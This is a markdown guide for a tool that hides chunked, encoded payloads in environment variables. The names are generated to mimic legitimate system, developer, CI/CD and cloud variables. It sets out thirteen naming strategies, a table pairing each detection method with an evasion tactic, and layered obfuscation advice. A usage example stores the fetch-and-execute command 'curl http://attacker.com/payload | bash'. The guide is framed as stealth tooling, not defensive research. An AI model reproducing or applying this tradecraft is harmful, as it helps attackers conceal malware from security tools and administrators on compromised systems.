# Environment Variable Naming Strategy Guide

## Overview

This guide documents the sophisticated naming strategy for environment variable storage that generates legitimate-looking variable names to evade detection and blend seamlessly into normal system environments.

## Key Concepts

### 1. **What is a Naming Strategy?**

A naming strategy is a systematic approach to generating environment variable names that:
- Look authentic and legitimate
- Follow platform conventions
- Blend with legitimate system/application variables
- Resist detection by security tools and audits
- Are deterministic (reproducible) or appropriately randomized

### 2. **Why Use Multiple Strategies?**

- **Defense in Depth**: Multiple strategies prevent pattern recognition
- **Environment Adaptation**: Different environments have different "normal" variable names
- **Rotation**: Using different strategies for different chunks reduces detection likelihood
- **Stealth**: Varying patterns makes automated detection more difficult

---

## Naming Strategies

### Strategy 1: SYSTEM_LEGACY
**Target Environment**: Legacy Windows systems, general enterprise

**Description**: Uses legacy Windows system variable names as prefixes/bases
- Examples: `TEMP`, `TMP`, `WINDIR`, `PATHEXT`, `SYSTEMROOT`

**Generated Names**:
```
TEMP_PATH_001
TMP_CONFIG_002
WINDIR_VERSION_001
SYSTEMROOT_CACHE_000
HOMEDRIVE_DATA_003
```

**Characteristics**:
- Extremely legitimate (real system variables)
- High blending capability
- Recognized by all Windows administrators
- Minimal suspicion

**Best For**:
- Windows enterprise environments
- Legacy system compatibility
- Scenarios where Windows system vars are expected

---

### Strategy 2: COMMON_TOOLS
**Target Environment**: Development machines, CI/CD pipelines

**Description**: Uses popular development tool prefixes
- Examples: `NODE_`, `PYTHON_`, `GIT_`, `NPM_`, `JAVA_`

**Generated Names**:
```
NODE_PATH_001
PYTHON_HOME_002
GIT_AUTHOR_003
NPM_TOKEN_000
YARN_CACHE_001
```

**Characteristics**:
- Very common on developer machines
- Appears legitimate in development contexts
- Recognized by most developers
- Expected in CI/CD environments

**Best For**:
- Development environments
- CI/CD pipelines
- Developer machines
- Build systems with tool support

---

### Strategy 3: BUILD_SYSTEM
**Target Environment**: Build environments, compilation systems

**Description**: Uses build system and compilation tool prefixes
- Examples: `CMAKE_`, `GRADLE_`, `MAVEN_`, `MAKE_`, `BAZEL_`

**Generated Names**:
```
CMAKE_BUILD_001
GRADLE_CONFIG_002
MAVEN_OPTS_003
MAKE_FLAGS_000
BAZEL_PATH_001
```

**Characteristics**:
- Expected in build environments
- Natural in CI/CD contexts
- Part of legitimate build configuration
- Low suspicion in compiled project builds

**Best For**:
- Build systems and compilation
- CI/CD environments with build tools
- Project build configurations
- Container builds

---

### Strategy 4: DEVELOPMENT
**Target Environment**: Development environments, testing systems

**Description**: Uses development and testing prefixes
- Examples: `DEBUG_`, `DEV_`, `TEST_`, `SANDBOX_`, `STAGING_`

**Generated Names**:
```
DEBUG_MODE_001
DEV_SERVER_002
TEST_DATA_003
SANDBOX_ENV_000
STAGING_URL_001
```

**Characteristics**:
- Natural in development environments
- Expected for debugging and testing
- Low suspicion on developer machines
- Common in local development setups

**Best For**:
- Local development environments
- Testing and QA systems
- Sandbox/staging environments
- Debugging scenarios

---

### Strategy 5: FRAMEWORK
**Target Environment**: Web application environments, framework deployments

**Description**: Uses popular web framework prefixes
- Examples: `DJANGO_`, `FLASK_`, `REACT_`, `ANGULAR_`, `EXPRESS_`

**Generated Names**:
```
DJANGO_SETTINGS_001
FLASK_ENV_002
REACT_APP_003
ANGULAR_CONFIG_000
EXPRESS_PORT_001
```

**Characteristics**:
- Natural in framework-based applications
- Expected in web application deployments
- Legitimate framework configuration
- High credibility in web contexts

**Best For**:
- Web application deployments
- Framework-based projects
- Application servers
- Web service environments

---

### Strategy 6: CONTAINER
**Target Environment**: Docker, Kubernetes, containerized systems

**Description**: Uses container and VM environment prefixes
- Examples: `DOCKER_`, `K8S_`, `KUBERNETES_`, `PODMAN_`

**Generated Names**:
```
DOCKER_HOST_001
K8S_NAMESPACE_002
KUBERNETES_SERVICE_003
PODMAN_SOCKET_000
CONTAINERD_PATH_001
```

**Characteristics**:
- Expected in containerized deployments
- Natural in orchestration systems
- Legitimate container configuration
- High credibility in cloud-native environments

**Best For**:
- Docker/container deployments
- Kubernetes clusters
- Container orchestration
- Cloud-native architectures

---

### Strategy 7: CI_CD
**Target Environment**: Continuous Integration/Deployment pipelines

**Description**: Uses CI/CD platform prefixes
- Examples: `CI_`, `CD_`, `GITHUB_`, `GITLAB_`, `JENKINS_`

**Generated Names**:
```
CI_COMMIT_001
CD_PIPELINE_002
GITHUB_TOKEN_003
GITLAB_CI_000
JENKINS_HOME_001
```

**Characteristics**:
- Expected in CI/CD environments
- Natural in automated pipelines
- Legitimate pipeline configuration
- Common in automation contexts

**Best For**:
- CI/CD pipelines
- Automated testing
- GitHub Actions, GitLab CI
- Jenkins environments

---

### Strategy 8: CLOUD
**Target Environment**: Cloud provider environments (AWS, Azure, GCP)

**Description**: Uses cloud provider prefixes
- Examples: `AWS_`, `AZURE_`, `GCP_`, `GCLOUD_`, `HEROKU_`

**Generated Names**:
```
AWS_ACCESS_KEY_001
AZURE_TENANT_002
GCP_PROJECT_003
GCLOUD_CONFIG_000
HEROKU_DYNO_001
```

**Characteristics**:
- Natural in cloud deployments
- Expected in cloud-native applications
- Legitimate cloud configuration
- High credibility in cloud contexts

**Best For**:
- Cloud provider deployments (AWS, Azure, GCP)
- Serverless environments
- Cloud-native applications
- Multi-cloud deployments

---

### Strategy 9: RUNTIME
**Target Environment**: Language runtime environments

**Description**: Uses programming language runtime prefixes
- Examples: `JAVA_`, `RUST_`, `GO_`, `PYTHONPATH`, `GOPATH`

**Generated Names**:
```
JAVA_HOME_001
RUST_FLAGS_002
GO_PATH_003
PYTHONPATH_000
JVM_OPTS_001
```

**Characteristics**:
- Natural in language-specific environments
- Expected runtime configuration
- Legitimate language support
- High credibility in development

**Best For**:
- Language-specific environments
- Runtime configuration
- Development environments
- Application servers

---

### Strategy 10: HASH_BASED
**Target Environment**: Any (deterministic, reproducible)

**Description**: Generates names using cryptographic hashing
- Pattern: `<prefix><MD5_HASH>`
- Deterministic for same input

**Generated Names**:
```
NODE_A3F2C8D1
PYTHON_5B9E7C2F
GIT_D4A1C8B7
GRADLE_E2F9D5A1
CMAKE_1C5B9D2E
```

**Characteristics**:
- Deterministic (reproducible for same input)
- Hard to reverse-engineer
- Blends with legitimate names
- Difficult for pattern-based detection

**Best For**:
- Scenarios requiring reproducibility
- Adversarial environments
- Cryptographic obfuscation
- Audit trail scenarios

---

### Strategy 11: RANDOM_ALPHA
**Target Environment**: Any (high randomization)

**Description**: Generates purely random alphanumeric strings
- Starts with letter (valid env var)
- Random length between min/max
- Includes numbers and letters

**Generated Names**:
```
XKQM7F9P2J
B4WL8N3R9T
D2GH7K5V9Q
M8PQRS4LN
Z7FGJK3NR
```

**Characteristics**:
- Highly random, difficult to predict
- No pattern for detection
- Looks like random identifiers
- Low legitimacy (suspicious if examined)

**Best For**:
- Truly covert scenarios
- Scenarios with weak monitoring
- Testing detection avoidance
- Non-Windows environments

---

### Strategy 12: MIXED_CASE
**Target Environment**: Any (typo-like appearance)

**Description**: Random case variation (looks like typos)
- Mimics accidental capitalization
- Appears humanly typed incorrectly
- Blends with real variable names

**Generated Names**:
```
NoDeJS_PaTh_001
PyThOn_HoMe_002
GrAdLe_CoNfIg_003
dJaNgO_SeT_000
fLaSk_EnV_001
```

**Characteristics**:
- Looks like human typos
- Less suspicious than pure random
- Blends with real variable names
- Difficult to pattern-match

**Best For**:
- Scenarios mimicking manual setup
- Typo-tolerant environments
- Systems with varied casing
- Non-case-sensitive systems

---

### Strategy 13: ACRONYM
**Target Environment**: Any (made-up but plausible)

**Description**: Creates pronounceable-ish acronyms
- Alternates consonants and vowels
- Looks like product names or codes
- Plausible but meaningless

**Generated Names**:
```
MORIDA_PATH_001
BELOTA_CONFIG_002
TOSERA_VERSION_003
MIMAKO_CACHE_000
SELOGA_DATA_001
```

**Characteristics**:
- Looks plausible and intentional
- Hard to reverse-engineer
- Appears as product/project codes
- Natural in enterprise environments

**Best For**:
- Enterprise environments
- Custom application names
- Internal project naming
- Scenarios with custom naming schemes

---

## Strategy Selection Guide

### By Environment Type

| Environment | Recommended Strategy | Fallback Options |
|------------|---------------------|------------------|
| Windows Enterprise | SYSTEM_LEGACY | COMMON_TOOLS, BUILD_SYSTEM |
| Developer Machine | COMMON_TOOLS | DEVELOPMENT, FRAMEWORK |
| Build System | BUILD_SYSTEM | CI_CD, COMMON_TOOLS |
| CI/CD Pipeline | CI_CD | BUILD_SYSTEM, CLOUD |
| Kubernetes | CONTAINER | CLOUD, RUNTIME |
| AWS/Cloud | CLOUD | CI_CD, CONTAINER |
| Web Application | FRAMEWORK | COMMON_TOOLS, DEVELOPMENT |
| Local Dev | DEVELOPMENT | COMMON_TOOLS, FRAMEWORK |
| Covert/Stealthy | HASH_BASED | MIXED_CASE, ACRONYM |

### By Detection Avoidance Priority

| Priority | Strategy | Rationale |
|----------|----------|-----------|
| Highest Legitimacy | SYSTEM_LEGACY | Uses real Windows system vars |
| High Legitimacy | COMMON_TOOLS | Used by millions of developers |
| Good Blend | BUILD_SYSTEM | Natural in build environments |
| Stealthy | HASH_BASED | Deterministic but hard to reverse |
| Covert | MIXED_CASE | Mimics human typos |
| Adversarial | ACRONYM | Looks intentional but meaningless |

---

## Configuration Options

### Naming Strategy Configuration Parameters

```python
@dataclass
class NamingStrategyConfig:
    primary_strategy: NamingStrategy          # Main strategy to use
    fallback_strategies: List[NamingStrategy] # Backup strategies
    add_version_suffix: bool = True           # Add version suffix to names
    add_timestamp: bool = False               # Add timestamp component
    randomize_case: bool = True               # Randomize letter case
    min_name_length: int = 8                  # Minimum variable name length
    max_name_length: int = 32                 # Maximum variable name length
    use_underscores: bool = True              # Allow underscores in names
    use_numbers: bool = True                  # Allow numbers in names
    chunk_numbering: str = "sequential"       # sequential, hex, random
    separator: str = "_"                      # Separator character
    seed: Optional[int] = None                # Random seed for reproducibility
```

### Enhanced Storage Configuration

```python
@dataclass
class EnhancedEnvVarConfig:
    scope: EnvVarScope = PROCESS              # PROCESS, USER, or SYSTEM
    encoding: EnvVarEncoding = BASE64         # BASE64, HEX, etc.
    chunk_size: int = 255                     # Size of each chunk
    prefix: str = "SC_"                       # Variable prefix
    use_obfuscation: bool = True              # Apply obfuscation
    compression: bool = True                  # Compress payload
    encryption: bool = False                  # Encrypt payload
    
    # Naming strategy options
    naming_strategy: NamingStrategy = COMMON_TOOLS
    fallback_naming_strategies: List[NamingStrategy] = [...]
    randomize_case: bool = True
    chunk_numbering: str = "sequential"
    use_strategy_rotation: bool = False       # Rotate through strategies
    naming_seed: Optional[int] = None         # Seed for reproducibility
    
    # Storage tracking
    track_metadata: bool = True               # Store metadata
    include_checksum: bool = True             # Include SHA256 checksum
```

---

## Implementation Patterns

### Pattern 1: Simple Single Strategy

```python
config = NamingStrategyConfig(
    primary_strategy=NamingStrategy.COMMON_TOOLS,
    fallback_strategies=[NamingStrategy.BUILD_SYSTEM]
)
namer = EnvVarNamingStrategy(config)
names = namer.generate_chunk_names("PAYLOAD_ID", 4)
```

**Output**:
```
NODE_PATH_001
PYTHON_HOME_002
GIT_AUTHOR_003
NPM_TOKEN_000
```

### Pattern 2: Rotation Strategy

```python
config = NamingStrategyConfig(
    primary_strategy=NamingStrategy.COMMON_TOOLS,
    fallback_strategies=[
        NamingStrategy.BUILD_SYSTEM,
        NamingStrategy.CLOUD,
        NamingStrategy.DEVELOPMENT
    ]
)
namer = EnvVarNamingStrategy(config)
names = namer.generate_with_rotation("PAYLOAD_ID", 6)
```

**Output** (rotating through strategies):
```
NODE_PATH_001
CMAKE_BUILD_002
AWS_ENDPOINT_003
DEBUG_MODE_004
PYTHON_HOME_005
GRADLE_CONFIG_006
```

### Pattern 3: Environment-Specific Recommendation

```python
multi_namer = MultiStrategyNamer()
config = multi_namer.generate_recommendation("cloud")
# Returns config optimized for cloud deployment
```

### Pattern 4: Diverse Set Generation

```python
multi_namer = MultiStrategyNamer()
diverse_sets = multi_namer.generate_diverse_set("PAYLOAD", 4, 3)
# Generates 3 different strategies, 4 chunks each
```

**Output**:
```
{
  "common_tools": ["NODE_PATH_001", "PYTHON_HOME_002", ...],
  "build_system": ["CMAKE_BUILD_001", "GRADLE_CONFIG_002", ...],
  "cloud": ["AWS_ENDPOINT_001", "AZURE_TENANT_002", ...]
}
```

---

## Advanced Techniques

### Technique 1: Deterministic Hash-Based Generation

Use hash-based strategy for reproducible variable names:

```python
config = NamingStrategyConfig(
    primary_strategy=NamingStrategy.HASH_BASED,
    seed=12345  # Deterministic seed
)
namer = EnvVarNamingStrategy(config)
```

**Benefit**: Same payload always generates same variable names
**Trade-off**: Less randomization = more predictable

### Technique 2: Strategy Rotation for Payload Chunks

Different strategies for different chunks evades pattern detection:

```python
config = EnhancedEnvVarConfig(
    naming_strategy=NamingStrategy.COMMON_TOOLS,
    use_strategy_rotation=True,
    fallback_naming_strategies=[
        NamingStrategy.BUILD_SYSTEM,
        NamingStrategy.DEVELOPMENT,
        NamingStrategy.CLOUD
    ]
)
writer = EnhancedEnvVarWriter(config)
```

**Benefit**: No consistent pattern across chunks
**Result**: Each chunk has different "type" of variable name

### Technique 3: Environment-Aware Selection

Automatically select strategy based on deployment environment:

```python
environments = {
    "local_dev": NamingStrategy.DEVELOPMENT,
    "ci_cd": NamingStrategy.CI_CD,
    "cloud_aws": NamingStrategy.CLOUD,
    "kubernetes": NamingStrategy.CONTAINER,
}

env = detect_current_environment()
strategy = environments.get(env, NamingStrategy.COMMON_TOOLS)
```

### Technique 4: Layered Obfuscation

Combine naming strategy with encoding:

```python
config = EnhancedEnvVarConfig(
    naming_strategy=NamingStrategy.HASH_BASED,  # Hard to reverse
    encoding=EnvVarEncoding.BASE64,              # Encoded payload
    use_obfuscation=True,                        # Additional obfuscation
    compression=True                             # Compress before encoding
)
writer = EnhancedEnvVarWriter(config)
```

**Benefit**: Multiple layers of obfuscation

---

## Detection Evasion Analysis

### What Makes Names Legitimate?

1. **Prefixes**: Match real tool/platform prefixes (NODE_, AWS_, etc.)
2. **Suffixes**: Use common configuration names (PATH, HOME, CONFIG, etc.)
3. **Numbering**: Sequential or meaningful chunk indices
4. **Case**: Follows platform conventions (UPPER_CASE for env vars)
5. **Length**: Within normal ranges (8-32 characters)

### What Looks Suspicious?

❌ Pure random alphanumeric (XKQM7F9P2J)
❌ Non-standard case (NoDeJs_PaTh)
❌ Too short (ABC, D12)
❌ Reserved keywords (TEMP as full name, not suffix)
❌ Special characters (%, &, *)
❌ Non-ASCII characters

### Detection Mitigation

| Detection Method | Evasion Strategy |
|-----------------|------------------|
| Signature matching | Use multiple strategies, rotate prefixes |
| Pattern analysis | Mix strategies, vary naming schemes |
| Entropy analysis | Use legitimate prefixes (reduce entropy) |
| Regex scanning | Avoid suspicious patterns, use real prefixes |
| Behavioral analysis | Make naming look intentional, use version suffixes |
| Machine learning | Rotate strategies, keep legitimacy high |

---

## Usage Examples

### Example 1: Quick Start

```python
from env_var_naming_strategy import EnvVarNamingStrategy, NamingStrategyConfig, NamingStrategy

config = NamingStrategyConfig(primary_strategy=NamingStrategy.COMMON_TOOLS)
namer = EnvVarNamingStrategy(config)
names = namer.generate_chunk_names("MY_SECRET", 4)

for name in names:
    print(name)
```

### Example 2: Cloud Deployment

```python
config = NamingStrategyConfig(
    primary_strategy=NamingStrategy.CLOUD,
    fallback_strategies=[
        NamingStrategy.CONTAINER,
        NamingStrategy.CI_CD
    ]
)
namer = EnvVarNamingStrategy(config)
names = namer.generate_chunk_names("CLOUD_PAYLOAD", 5)
```

### Example 3: Full Integration

```python
from env_var_storage_with_naming import EnhancedEnvVarWriter, EnhancedEnvVarConfig, NamingStrategy

config = EnhancedEnvVarConfig(
    naming_strategy=NamingStrategy.COMMON_TOOLS,
    use_strategy_rotation=True
)

writer = EnhancedEnvVarWriter(config)
success, var_names, message = writer.write_to_env(
    "SECRET_ID",
    "curl http://attacker.com/payload | bash"
)

print(f"Success: {success}")
print(f"Variables: {var_names}")
```

---

## Security Considerations

### Strengths

✓ Legitimate-looking variable names
✓ Multiple strategy options for different contexts
✓ Difficult for regex/signature-based detection
✓ Blends with real environment variables
✓ Environment-aware selection possible

### Limitations

⚠ System inspection can reveal purpose
⚠ Does not prevent forensic analysis
⚠ Sophisticated monitoring may detect patterns
⚠ Not cryptographic security (naming only)
⚠ Encoded/compressed payloads still visible

### Best Practices

1. **Combine with Encoding**: Use BASE64 or HEX encoding
2. **Use Rotation**: Rotate through strategies for chunks
3. **Match Environment**: Select strategy appropriate for deployment
4. **Minimize Metadata**: Don't store obvious metadata in variable names
5. **Regular Rotation**: Periodically change strategies in long-running systems
6. **Clean Up**: Remove variables when no longer needed

---

## Reference

### Strategy Comparison Matrix

| Strategy | Legitimacy | Randomness | Pattern Risk | Best Context |
|----------|------------|------------|--------------|--------------|
| SYSTEM_LEGACY | Very High | Low | Low | Windows Enterprise |
| COMMON_TOOLS | Very High | Low | Low | Development |
| BUILD_SYSTEM | High | Low | Low | Build Systems |
| DEVELOPMENT | High | Low | Low | Dev Environments |
| FRAMEWORK | High | Low | Low | Web Apps |
| CONTAINER | High | Low | Low | Docker/K8s |
| CI_CD | High | Low | Low | CI/CD Pipelines |
| CLOUD | High | Low | Low | Cloud Providers |
| RUNTIME | High | Low | Low | Language Runtimes |
| HASH_BASED | Medium | High | Medium | Covert/Reproducible |
| RANDOM_ALPHA | Low | Very High | High | Testing |
| MIXED_CASE | Medium | High | High | Typo Scenarios |
| ACRONYM | Medium | High | Medium | Enterprise Custom |

---

## Conclusion

The environment variable naming strategy provides a sophisticated approach to generating legitimate-looking variable names for payload storage. By leveraging multiple strategies and environment-aware selection, it enables effective stealth while maintaining compatibility with real-world deployment scenarios.

Key takeaway: **Legitimacy through context** - the best names are those that match the legitimate variables already present in the target environment.
